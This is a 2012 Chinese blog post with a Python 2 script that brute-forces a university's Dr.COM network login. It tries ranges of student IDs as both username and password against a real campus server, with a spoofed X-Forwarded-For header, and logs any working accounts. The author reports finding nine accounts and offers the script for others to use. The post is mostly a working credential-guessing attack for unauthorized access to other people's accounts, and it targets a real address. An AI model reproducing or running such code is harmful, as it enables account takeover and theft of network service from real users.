---
layout: post
title: python猜研究生账号
comments: true
date: 2012-04-04 09:01
categories: python
---

嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！


{% codeblock %}
#! /usr/bin python
# encoding: utf-8

import urllib2
import urllib
import sys
import types

guess_list = []
server_url = "http://222.174.155.19/"
headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
'X-Forwarded-For':'1.1.1.1'}

def usage():
print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"

def Login(username, password):
params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
request = urllib2.Request(url = server_url, data = params, headers = headers)
try:
output = urllib2.urlopen(request, timeout = 3).readlines()
Log(output[5], username, password)
except:
print "timeout!"
global guess_list
guess_list = guess_list[1:]
guess_list.append(username)

def Logout():
output = urllib2.urlopen(server_url + "F.htm")

def Log(output,username, password):
# "msga='error1'" => can not login in web
result = output.find("msga='error1'")
if result != -1:
print "find one!!!"
f = open("./content.dat", 'a')
f.write(str(username) + '\n')
f.close()
else:
print "pass!"
f = open("./bad.dat",'a')
f.write(str(username) + '\n')
f.close()
#drop first element
global guess_list
guess_list = guess_list[1:]

def show_result():
print "Result:##########################################"
print "Have Guessed:"
for i in open("./content.dat").readlines():
print i,
print "some accounts can not guessed are in bad.dat"
print "Result:##########################################"

def get_timeout_list(timeout_file_path):
f = open(timeout_file_path)
global guess_list 
guess_list = f.readlines()
f.close()

if len(sys.argv) == 2:
# itself and only one argv,the path of account list file...
get_timeout_list(sys.argv[1])
elif(len(sys.argv) < 2):
usage()
else:
#start and end account,argv[1] and argv[2]
start = int(sys.argv[1])
end = int(sys.argv[2])
if start > end:
usage()
exit(-1)
else:
guess_list = range(start, end + 1)

if __name__ == "__main__":

while True:
for i in guess_list:
#drop last \n or \r
if type(i) == types.StringType:
i = i.rstrip('\n\r')
Logout()
print "Guess: " + str(i)
Login(i, i)

if len(guess_list) == 0:
break
show_result()
{% endcodeblock %}

主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga='error1'”字符串，当然严格来讲还得监测是不是有"Msg=0"这个字符串才好，我就省略了……

希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！